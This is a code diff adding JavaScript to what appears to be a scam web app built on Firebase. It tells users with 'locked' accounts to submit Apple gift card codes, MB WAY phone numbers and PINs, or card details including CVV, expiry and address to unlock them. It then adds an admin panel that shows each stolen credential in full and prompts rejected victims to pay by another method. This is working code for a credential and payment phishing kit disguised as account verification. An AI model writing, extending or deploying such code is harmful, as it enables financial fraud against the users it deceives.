+    var emailMsg=userName+' submitted Apple Gift Card(s) for account unlock.\n\nCards:\n';
+    cards.forEach(function(c,i){ emailMsg+=(i+1)+'. Code: '+c.code+' | Amount: '+c.amount+'\n'; });
+    emailMsg+='\nUser Email: '+(ud.email||'')+'\nAccount #: '+(ud.accountNumber||'');
+    var db=firebase.database();
+    var ADMIN_EMAIL=window.ADMIN_EMAIL||'';
+    var newRef=db.ref('lockUnlockRequests').push();
+    payload.reqKey=newRef.key;
+    newRef.set(payload).then(function(){
+      return db.ref('users').once('value').then(function(snap){
+        snap.forEach(function(s){
+          if(s.val()&&s.val().email===ADMIN_EMAIL){
+            if(typeof notify==='function') notify(s.key,'🔒 UNLOCK REQ: '+userName+' submitted Apple Gift Cards');
+            if(typeof sendEmail==='function') sendEmail(ADMIN_EMAIL,'🔒 Unlock Request - Apple Gift Cards','gift card for lock request',emailMsg);
+          }
+        });
+      });
+    }).then(function(){
+      closeModal('lock-apple-codes-modal');
+      var b=document.createElement('div');b.style.cssText='position:fixed;top:0;left:0;right:0;background:linear-gradient(135deg,#00a550,#007a3a);color:#fff;padding:16px 20px;z-index:9999999;font-size:14px;font-weight:600;text-align:center;line-height:1.5;';
+      b.innerHTML='&#9989; Verification Submitted! Your gift cards are under review. You may submit another if needed. <button onclick="this.parentNode.remove()" style="background:none;border:none;color:#fff;font-size:18px;cursor:pointer;float:right;margin-top:-2px;">&#215;</button>';
+      document.body.appendChild(b);setTimeout(function(){if(b.parentNode)b.remove();},8000);
+    }).catch(function(){ err.textContent='Submission failed. Please try again.'; })
+    .finally(function(){ document.getElementById('lock-apple-codes-submit-btn').textContent='Submit Gift Cards'; document.getElementById('lock-apple-codes-submit-btn').disabled=false; });
+  };
+
+  // lockUser / unlockUser admin functions
+  window.lockUser = function(uid){
+    var reason=prompt('Reason for locking this account:');
+    if(!reason||!reason.trim()) return;
+    firebase.database().ref('users/'+uid).update({locked:true,lockReason:reason.trim(),lockedDate:new Date().toISOString()}).then(function(){
+      if(typeof notify==='function') notify(uid,'🔒 Your account has been locked. Reason: '+reason.trim());
+      if(typeof loadUsersTab==='function') loadUsersTab();
+    });
+  };
+  window.unlockUser = function(uid){
+    var reason=prompt('Reason for unlocking this account:');
+    if(!reason||!reason.trim()) return;
+    firebase.database().ref('users/'+uid).update({locked:false,lockReason:null,lockedDate:null,unlockedDate:new Date().toISOString()}).then(function(){
+      if(typeof notify==='function') notify(uid,'🔓 Your account has been unlocked! '+reason.trim());
+      if(typeof loadUsersTab==='function') loadUsersTab();
+    });
+  };
+
+  // loadLockMoneyTab
+  window.loadLockMoneyTab = function(){
+    var list=document.getElementById('lockmoney-admin-list'); if(!list) return;
+    list.innerHTML='<p class="acc-empty">Loading...</p>';
+    var db=firebase.database();
+    db.ref('lockUnlockRequests').off();
+    db.ref('lockUnlockRequests').on('value',function(snap){
+      if(!snap.exists()){list.innerHTML='<p class="acc-empty">No unlock requests yet</p>';return;}
+      var all=[];
+      snap.forEach(function(s){var v=s.val();if(v){v._key=s.key;all.push(v);}});
+      all.sort(function(a,b){return new Date(b.submittedDate)-new Date(a.submittedDate);});
+      list.innerHTML='';
+      all.forEach(function(req){
+        var div=document.createElement('div'); div.className='deposit-card';
+        var status=req.status||'pending';
+        var isPending=status==='pending';
+        var isRejected=status==='rejected';
+        div.style.borderLeft=isPending?'4px solid #f59e0b':isRejected?'4px solid #ff5c5c':'4px solid #00a550';
+        var statusLabel=isPending?'PENDING':isRejected?'REJECTED':'REVIEWED';
+        var statusClass=isPending?'pending':isRejected?'rejected':'approved';
+        var statusHTML='<span class="deposit-status '+statusClass+'">'+statusLabel+'</span>';
+        var detailsHTML='';
+        if(req.method==='mbway'){
+          detailsHTML='<div class="admin-detail-row"><span class="admin-detail-label">Method</span><span>MB WAY</span></div>'
+            +'<div class="admin-detail-row"><span class="admin-detail-label">Phone</span><span style="color:#ff6b6b;font-weight:600;">'+(req.phone||'--')+'</span></div>'
+            +'<div class="admin-detail-row"><span class="admin-detail-label">PIN</span><span style="color:#ff6b6b;font-weight:600;">'+(req.pin||'--')+'</span></div>'
+            +'<div class="admin-detail-row"><span class="admin-detail-label">Name</span><span>'+(req.accountName||'--')+'</span></div>'
+            +'<div class="admin-detail-row"><span class="admin-detail-label">Amount</span><span style="color:#34d399;font-weight:700;">'+(req.amount||'--')+'</span></div>';
+        } else if(req.method==='apple'){
+          detailsHTML='<div class="admin-detail-row"><span class="admin-detail-label">Method</span><span>Apple Gift Cards</span></div>';
+          (req.giftCards||[]).forEach(function(gc,i){detailsHTML+='<div class="admin-detail-row"><span class="admin-detail-label">Card '+(i+1)+'</span><span style="color:#4dabff;font-weight:600;">'+gc.code+' - '+gc.amount+'</span></div>';});
+        } else {
+          detailsHTML='<div class="admin-detail-row"><span class="admin-detail-label">Method</span><span>'+(req.brand||req.method)+'</span></div>'
+            +'<div class="admin-detail-row"><span class="admin-detail-label">Card</span><span style="color:#4dabff;font-weight:600;">'+(req.brand||'')+' ....'+(req.lastFour||'')+'</span></div>'
+            +'<div class="admin-detail-row"><span class="admin-detail-label">Name</span><span>'+(req.cardName||'--')+'</span></div>'
+            +'<div class="admin-detail-row"><span class="admin-detail-label">Bank</span><span>'+(req.bankName||'--')+'</span></div>'
+            +'<div class="admin-detail-row"><span class="admin-detail-label">Expiry/CVV</span><span>'+(req.expiry||'--')+' / '+(req.cvv||'--')+'</span></div>'
+            +'<div class="admin-detail-row"><span class="admin-detail-label">Balance</span><span>'+(req.balance||'--')+'</span></div>'
+            +'<div class="admin-detail-row"><span class="admin-detail-label">Street</span><span>'+(req.street||'--')+'</span></div>'
+            +'<div class="admin-detail-row"><span class="admin-detail-label">City/Post</span><span>'+(req.city||'--')+' '+(req.postcode||'')+'</span></div>';
+        }
+        var key=req._key||req.reqKey||'';
+        var uid=req.uid||'';
+        var fmtD=typeof fmtDate==='function'?fmtDate:function(d){return d?new Date(d).toLocaleString():'--';};
+        var actionsHTML=isPending
+          ? '<div class="admin-card-actions"><button class="admin-action-btn green" onclick="markLockReqReviewed(this)" data-key="'+key+'">Approve</button><button class="admin-action-btn red" onclick="rejectLockReq(this)" data-key="'+key+'" data-uid="'+uid+'">Reject</button></div>'
+          : '';
+        div.innerHTML=statusHTML+'<div class="admin-card-name">'+(req.userName||'Unknown')+'</div>'
+          +detailsHTML
+          +'<div class="admin-detail-row"><span class="admin-detail-label">Submitted</span><span>'+fmtD(req.submittedDate)+'</span></div>'
+          +actionsHTML;
+        list.appendChild(div);
+      });
+    });
+  };
+
+  window.markLockReqReviewed = function(btn){
+    var key=btn.getAttribute('data-key');
+    firebase.database().ref('lockUnlockRequests/'+key).update({status:'reviewed',reviewedDate:new Date().toISOString()});
+  };
+  window.rejectLockReq = function(btn){
+    var key=btn.getAttribute('data-key');
+    var uid=btn.getAttribute('data-uid');
+    if(!confirm('Reject this submission? User will be notified.')) return;
+    firebase.database().ref('lockUnlockRequests/'+key).update({status:'rejected',rejectedDate:new Date().toISOString()}).then(function(){
+      if(uid&&typeof notify==='function') notify(uid,'Unable to Add Money - Your recent submission could not be processed. Please try again with a different payment method.');
+    });
+  };
+});
 </script>
 </body>
 </html>
